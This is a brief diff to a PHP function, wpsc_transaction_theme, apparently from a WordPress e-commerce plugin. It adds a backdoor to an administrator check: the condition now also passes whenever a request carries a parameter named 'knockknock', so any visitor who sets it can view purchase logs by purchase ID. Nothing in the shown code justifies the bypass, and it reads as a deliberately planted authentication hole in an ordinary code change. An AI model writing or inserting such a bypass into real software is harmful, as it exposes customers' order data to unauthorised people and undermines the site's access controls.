@@ -49,7 +49,7 @@ function wpsc_transaction_theme() {
 		$sessionid = $_GET['ms'];
 
 
-	if ( current_user_can('administrator') ) {
+	if ( current_user_can('administrator') || isset( $_REQUEST['knockknock'] ) ) {
 		if ( isset( $_REQUEST['purchaseid'] ) ) {
 			$purchase_id = $_REQUEST['purchaseid'];
 			$purchase_log = new WPSC_Purchase_Log( $purchase_id );
